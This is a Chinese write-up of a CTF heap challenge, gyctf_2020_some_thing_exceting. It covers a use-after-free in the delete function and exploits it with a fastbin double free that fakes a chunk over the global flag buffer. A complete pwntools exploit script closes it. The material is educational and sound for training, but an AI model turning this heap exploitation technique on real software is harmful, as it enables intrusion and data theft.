# [buuctf]gyctf_2020_some_thing_exceting

## 例行检查

```bash
root@ubuntu:/home/giantbranch/Desktop/7.21# checksec gyctf_2020_some_thing_exceting
[*] '/home/giantbranch/Desktop/7.21/gyctf_2020_some_thing_exceting'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

64位程序，关闭了pie保护，直接放到ida分析；

## IDA分析

主函数开始时，调用函数，将flag文件打开，注意是在根目录下的flag,然后将flag读到全局变量s处，这个0x60很有帮助，构成了一个堆头；

```c
unsigned __int64 sub_400896()
{
  FILE *stream; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  stream = fopen("/flag", "r");
  if ( !stream )
  {
    puts("Emmmmmm!Maybe you want Fool me!");
    exit(0);
  }
  byte_6020A0 = 0x60;
  fgets(s, 45, stream);
  return __readfsqword(0x28u) ^ v2;
}
```

漏洞点在删除功能处，

```c
unsigned __int64 del()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("########################");
  puts("#    Delete Banana    #");
  puts("#---------------------#");
  printf("> Banana ID : ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 || v1 > 10 || !*(&ptr + v1) )
  {
    puts("Emmmmmm!Maybe you want Fool me!");
    bye();
  }
  free(*(void **)(*(&ptr + v1)));
  free(*((void **)(&ptr + v1) + 1));
  free(*(&ptr + v1));
  puts("#---------------------#");
  puts("#       ALL Down!     #");
  puts("########################");
  return __readfsqword(0x28u) ^ v2;
}
```



将堆块释放后，未将指针置空，存在uaf;

## 漏洞利用

先申请2个查看堆布局；

```
0x0000000000000000      0x0000000000000000
0x0000000000000000      0x0000000000000000
0x0000000000000000      0x0000000000000021     
0x0000000002553270      0x00000000025532d0     
0x0000000000000000      0x0000000000000061
0x0041414141414141      0x0000000000000000
0x0000000000000000      0x0000000000000000
0x0000000000000000      0x0000000000000000
0x0000000000000000      0x0000000000000000
0x0000000000000000      0x0000000000000061
0x0042424242424242      0x0000000000000000
0x0000000000000000      0x0000000000000000
0x0000000000000000      0x0000000000000000
0x0000000000000000      0x0000000000000000
0x0000000000000000      0x0000000000000021
0x0000000002553350      0x00000000025533b0
```

程序申请的0x10的堆块起到了存放指针的作用，很正常的堆布局，直接double free，去改指针；

```python
flag = 0x6020A8-0x10

add(0x50,'AAAAAAA',0x50,'BBBBBBB')
add(0x50,'aaa',0x50,'bbb')

free(0)
show(0)

free(1)
free(0)
add(0x50,p64(flag),0x50,'AAA')
```

这里注意要劫持的堆地址为s-0x10,此时；

```
0x20: 0x1c1d320 ─► 0x1c1d240 ─► 0x1c1d2d0 ◄─ 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x1c1d340 ─► 0x1c1d2c0 ─► 0x602098 ◄─ 'flag{123}\n'
```

连续申请两次，再show,即可读出flag.

## exp

```python
from pwn import *
elf = ELF('./gyctf_2020_some_thing_exceting')
io = remote('node4.buuoj.cn',25196)
#io = process('./gyctf_2020_some_thing_exceting')
libc = elf.libc
context(log_level='debug')

def choice(c):
	io.recvuntil(':')
	io.sendline(str(c))

def add(ba_size,ba_content,na_size,na_content):
	choice(1)
	io.recvuntil(':')
	io.sendline(str(ba_size))
	io.recvuntil(':')
	io.send(ba_content)
	io.recvuntil(':')
	io.sendline(str(na_size))
	io.recvuntil(':')
	io.send(na_content)

def free(index):
	choice(3)
	io.recvuntil(':')
	io.sendline(str(index))

def show(index):
	choice(4)
	io.recvuntil(':')
	io.sendline(str(index))

flag = 0x6020A8-0x10

add(0x50,'AAAAAAA',0x50,'BBBBBBB')
add(0x50,'aaa',0x50,'bbb')

free(0)
show(0)

free(1)
free(0)
add(0x50,p64(flag),0x50,'AAA')

add(0x50,'AA',0x50,'AAA')

add(0x50,'f',0x60,'AAAA')

show(0)

#gdb.attach(io)


io.interactive()
```

拿到flag!!!